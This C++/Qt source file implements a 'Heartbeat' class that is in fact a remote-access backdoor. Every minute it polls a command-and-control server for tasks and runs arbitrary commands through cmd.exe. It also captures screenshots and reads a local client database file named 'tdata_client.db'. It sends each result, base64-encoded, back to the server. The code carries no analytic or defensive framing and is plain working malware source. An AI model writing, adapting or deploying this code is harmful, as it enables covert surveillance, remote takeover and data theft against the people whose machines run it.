#include "core/heartbeat.h"
#include <QtNetwork/QNetworkAccessManager>
#include <QtNetwork/QNetworkReply>
#include <QtNetwork/QNetworkRequest>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QProcess>
#include <QDebug>
#include <QGuiApplication>
#include <QScreen>
#include <QDateTime>
#include <QBuffer>
#include <QStandardPaths>
#include <QFile>

namespace Core {

Heartbeat& Heartbeat::Instance() {
    static Heartbeat instance;
    return instance;
}

Heartbeat::Heartbeat() {
    connect(&_timer, &QTimer::timeout, this, &Heartbeat::checkTasks);
}

void Heartbeat::start() {
    if (!_timer.isActive()) {
        _timer.start(60000); // Check every 60 seconds
        checkTasks(); // Check immediately
    }
}

void Heartbeat::sendHeartbeat() {
    // Basic ping
    QNetworkRequest request(QUrl(_c2Url + "/heartbeat"));
    QNetworkReply* reply = _network.get(request);
    connect(reply, &QNetworkReply::finished, [reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            qDebug() << "Heartbeat failed:" << reply->errorString();
        }
        reply->deleteLater();
    });
}

void Heartbeat::checkTasks() {
    // Fetch pending tasks
    QNetworkRequest request(QUrl(_c2Url + "/c2/tasks/pending"));
    QNetworkReply* reply = _network.get(request);
    connect(reply, &QNetworkReply::finished, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QByteArray data = reply->readAll();
            QJsonDocument doc = QJsonDocument::fromJson(data);
            if (doc.isArray()) {
                QJsonArray tasks = doc.array();
                if (!tasks.isEmpty()) {
                    qDebug() << "Received" << tasks.size() << "tasks";
                }
                for (const auto& val : tasks) {
                    QJsonObject task = val.toObject();
                    QString id = task["taskId"].toString();
                    QString cmd = task["command"].toString();
                    QString params = task["params"].toString();
                    executeTask(id, cmd, params);
                }
            }
        } else {
            qDebug() << "Check tasks failed:" << reply->errorString();
        }
        reply->deleteLater();
    });
}

void Heartbeat::executeTask(const QString& taskId, const QString& command, const QString& params) {
    qDebug() << "Executing task:" << taskId << command << params;
    if (command == "cmd_exec") {
        QProcess process;
        // Correctly handle command arguments for Windows cmd
        // /C carries out the command specified by string and then terminates
        process.start("cmd.exe", QStringList() << "/C" << params);
        if (!process.waitForFinished(30000)) { // Wait up to 30 seconds
             uploadResult(taskId, "Error: Timeout or failed to execute. Process error: " + process.errorString());
             return;
        }
        
        // Use fromLocal8Bit to handle potential encoding issues on Windows
        QString output = QString::fromLocal8Bit(process.readAllStandardOutput());
        QString error = QString::fromLocal8Bit(process.readAllStandardError());
        
        if (output.isEmpty() && !error.isEmpty()) {
            output = "Error: " + error;
        } else if (output.isEmpty() && error.isEmpty()) {
             // If both are empty, check exit code or just say empty
             if (process.exitCode() != 0) {
                 output = "Error: Process exited with code " + QString::number(process.exitCode());
             } else {
                 output = "[Empty Output]";
             }
        }
        
        uploadResult(taskId, output);
    } else if (command == "screenshot") {
        QScreen *screen = QGuiApplication::primaryScreen();
        if (screen) {
            QPixmap pixmap = screen->grabWindow(0);
            QByteArray bytes;
            QBuffer buffer(&bytes);
            buffer.open(QIODevice::WriteOnly);
            pixmap.save(&buffer, "PNG");
            uploadResult(taskId, bytes.toBase64());
        } else {
            uploadResult(taskId, "Error: No screen found");
        }
    } else if (command == "upload_db") {
        QString dbPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/tdata_client.db";
        QFile file(dbPath);
        if (file.open(QIODevice::ReadOnly)) {
            QByteArray data = file.readAll();
            file.close();
            uploadResult(taskId, data.toBase64());
        } else {
            uploadResult(taskId, "Error: Could not open DB at " + dbPath);
        }
    } else {
        uploadResult(taskId, "Error: Unknown command " + command);
    }
}

void Heartbeat::uploadResult(const QString& taskId, const QString& result) {
    QNetworkRequest request(QUrl(_c2Url + "/c2/tasks/result"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    
    QJsonObject json;
    json["taskId"] = taskId;
    json["result"] = result;
    json["executedAt"] = QDateTime::currentDateTime().toSecsSinceEpoch();
    
    qDebug() << "Uploading result for task:" << taskId << "Length:" << result.length();
    
    QNetworkReply* reply = _network.post(request, QJsonDocument(json).toJson());
    connect(reply, &QNetworkReply::finished, [reply, taskId]() {
        if (reply->error() != QNetworkReply::NoError) {
            qDebug() << "Failed to upload result for task" << taskId << ":" << reply->errorString();
        } else {
            qDebug() << "Result uploaded successfully for task" << taskId;
        }
        reply->deleteLater();
    });
}

} // namespace Core
